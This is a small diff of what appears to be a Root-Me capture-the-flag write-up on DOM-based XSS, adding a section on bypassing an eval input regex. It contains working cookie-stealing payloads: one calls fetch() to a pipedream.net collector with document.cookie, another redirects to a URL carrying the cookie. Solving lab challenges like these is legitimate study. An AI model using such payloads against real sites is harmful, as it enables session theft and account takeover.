@@ -32,3 +32,7 @@ This will break `''` of `number` variable, add `fetch` into script.
 
 Submit URL in `Contact` page with param `RootmeURL?number='; fetch("https://eo944ovuf06595y.m.pipedream.net?c="+document.cookie)//`
 
+### XSS DOM Based - Eval
+This web use regex  /^\d+[\+|\-|\*|\/]\d+/ to check input. We can bypass by using the following input:
+
+``1*24+";window.location.href=`URL?c=`+document.cookie;//"``
